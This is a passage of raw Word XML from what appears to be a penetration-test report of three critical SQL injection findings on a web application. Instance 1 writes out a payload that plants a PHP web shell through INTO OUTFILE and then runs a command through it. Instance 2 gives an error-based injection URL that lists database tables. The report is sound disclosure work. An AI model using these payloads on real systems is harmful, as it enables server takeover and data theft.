            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Risk Rating</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Issue Count</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="003D2007" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1920" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Source</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1921" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Dynamic Manual Analysis</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="909"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00D9541D" w:rsidRPr="00D9541D" w:rsidRDefault="00D9541D" w:rsidP="00D9541D">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D9541D">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00D9541D" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00D9541D">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure, or perform a denial-of-service attack.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidTr="00A81704">
        <w:trPr>
          <w:trHeight w:val="1165"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="11520" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
          </w:tcPr>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Instance1</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00D9541D" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:hyperlink r:id="rId13" w:history="1">
              <w:r w:rsidR="00D9541D" w:rsidRPr="00147D31">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/core/adodb/server.php?sql</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidR="00D9541D" w:rsidRPr="00D9541D">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>=</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00D9541D" w:rsidRDefault="00D9541D" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Vulnerable Parameter: </w:t>
            </w:r>
            <w:r w:rsidR="00D9541D">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>sql</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00D9541D" w:rsidRDefault="00D9541D" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00D9541D" w:rsidRDefault="00D9541D" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00D9541D" w:rsidRPr="00802CE3" w:rsidRDefault="00D9541D" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>S</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>teps</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00D9541D" w:rsidRDefault="00D9541D" w:rsidP="003D2007">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Navigate to above URL.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="00D9541D" w:rsidP="003D2007">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Enter </w:t>
            </w:r>
            <w:r w:rsidRPr="00D9541D">
              <w:rPr>
                <w:i/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>SELECT%20%27%3C?%20system($_GET[\%27cmd\%27]);%20?%3E%27%20INTO%20OUTFILE%20%27/var/www/html/65bd6d4a-0150-4ecd-98f3-7482692f7872/shell.php%27;</w:t>
            </w:r>
            <w:r w:rsidR="00A81704">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> in the </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:i/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>sql</w:t>
            </w:r>
            <w:r w:rsidR="00A81704">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> parameter.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00D9541D" w:rsidRPr="00D9541D" w:rsidRDefault="00D9541D" w:rsidP="003D2007">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="13"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Navigate to the URL </w:t>
            </w:r>
            <w:hyperlink r:id="rId14" w:history="1">
              <w:r w:rsidRPr="00D9541D">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/shell.php?cmd=ls%20-al</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Screenshot:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00D9541D" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="036F602A" wp14:editId="4AEF7121">
                  <wp:extent cx="7245350" cy="38900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245350" cy="3890010"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Fig 1. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>SQL Injection</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Instance2</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>URL</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">  </w:t>
            </w:r>
            <w:hyperlink r:id="rId16" w:history="1">
              <w:r w:rsidRPr="00147D31">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:sz w:val="28"/>
                  <w:szCs w:val="28"/>
                </w:rPr>
                <w:t>http://52.23.185.72/65bd6d4a-0150-4ecd-98f3-7482692f7872/view_all_set.php?sort=id%2Cextractvalue%28null%2Cconcat%280x3a%2C%28SELECT%20group_concat%280x2D%2Ctable_schema%2C0x2E%2Ctable_name%2C0x2D%29%20FROM%20information_schema.tables%20WHERE%20table_schema%20%21%3D%200x6D7973716C%20AND%20table_schema%20%21%3D%200x696E666F726D6174696F6E5F736368656D61%29%2C0x3a%29%29%20--&amp;dir=ASC,&amp;type=2</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">Vulnerable Parameter: </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>sort</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>S</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>teps</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="003D2007">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="15"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Navigate to above URL.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="003D2007" w:rsidRPr="009F5B1D" w:rsidRDefault="003D2007" w:rsidP="003D2007">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:numPr>
                <w:ilvl w:val="0"/>
                <w:numId w:val="15"/>
              </w:numPr>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Observe the SQL Injection stack trace.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Screenshot:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="009F5B1D" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:noProof/>
                <w:lang w:eastAsia="en-IN"/>
              </w:rPr>
              <w:drawing>
                <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5554DE30" wp14:editId="536E3EC1">
                  <wp:extent cx="7245350" cy="38900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245350" cy="3890010"/>
                          </a:xfrm>
                          <a:prstGeom prst="rect">
                            <a:avLst/>
                          </a:prstGeom>
                        </pic:spPr>
                      </pic:pic>
                    </a:graphicData>
                  </a:graphic>
                </wp:inline>
              </w:drawing>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRPr="00802CE3" w:rsidRDefault="0060276E" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRPr="00802CE3" w:rsidRDefault="00A81704" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="00A81704" w:rsidRDefault="0060276E" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Fig 2</w:t>
            </w:r>
            <w:r w:rsidR="00A81704" w:rsidRPr="00802CE3">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>SQL</w:t>
            </w:r>
            <w:r w:rsidR="00A81704">
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t xml:space="preserve"> Injection</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="00A81704">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>Instance3</w:t>
            </w:r>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:b/>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="0060276E" w:rsidRDefault="0060276E" w:rsidP="0060276E">
            <w:pPr>
              <w:pStyle w:val="TableContents"/>
              <w:rPr>
                <w:sz w:val="28"/>
                <w:szCs w:val="28"/>
              </w:rPr>
            </w:pPr>
